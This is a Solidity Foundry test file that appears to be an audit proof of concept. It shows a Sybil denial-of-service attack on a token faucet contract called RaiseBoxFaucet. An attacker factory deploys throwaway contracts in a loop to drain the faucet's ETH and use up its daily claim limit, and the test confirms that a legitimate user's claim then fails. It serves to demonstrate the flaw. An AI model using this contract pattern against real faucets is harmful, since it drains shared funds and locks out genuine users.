// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.30;

import {Test, console} from "../lib/forge-std/src/Test.sol";
import {RaiseBoxFaucet} from "../src/RaiseBoxFaucet.sol";
import {DeployRaiseboxContract} from "../script/DeployRaiseBoxFaucet.s.sol";

contract SybilDDoSAttackTest is Test {
    RaiseBoxFaucet raiseBoxFaucet;
    DeployRaiseboxContract raiseBoxDeployer;

    // Test: Users
    address user1 = makeAddr("user1");
    address user2 = makeAddr("user2");

    address owner;
    address raiseBoxFaucetContractAddress;

    // test constants
    uint256 public constant INITIAL_SUPPLY_MINTED = 1000000000 * 10 ** 18;

    /**
     * @dev Helper function to simulate time passing since testing environment doesn't work as expected
     * @param duration_ amount of time to advanced, could be in days, hours, minutes or seconds. default is seconds*
     */
    function advanceBlockTime(uint256 duration_) internal {
        vm.warp(duration_);
    }

    function setUp() public {
        owner = address(this);

        raiseBoxFaucet = new RaiseBoxFaucet(
            "raiseboxtoken",
            "RB",
            1000 * 10 ** 18,
            0.005 ether,
            0.5 ether
        );

        raiseBoxFaucetContractAddress = address(raiseBoxFaucet);

        raiseBoxDeployer = new DeployRaiseboxContract();

        vm.deal(raiseBoxFaucetContractAddress, 1 ether);
        vm.deal(owner, 100 ether);

        advanceBlockTime(3 days); // 3 days
    }

    function testSybilDDoSAttack() public {
        vm.startPrank(user1);
        new AttackerFactory(raiseBoxFaucet);
        vm.stopPrank();

        vm.expectRevert();
        vm.startPrank(user2);
        raiseBoxFaucet.claimFaucetTokens();
        vm.stopPrank();
    }
}

contract AttackerFactory {
    constructor(RaiseBoxFaucet faucet_) {
        faucet_.claimFaucetTokens();
        while (true) {
            if (
                address(faucet_).balance <= faucet_.sepEthAmountToDrip() ||
                faucet_.dailyClaimCount() >= faucet_.dailyClaimLimit()
            ) {
                break;
            }
            SybilAttacker newAttacker = new SybilAttacker();
            newAttacker.claim(faucet_);
        }
    }
}

contract SybilAttacker {
    function claim(RaiseBoxFaucet faucet_) external {
        faucet_.claimFaucetTokens();
    }

    receive() external payable {}
}
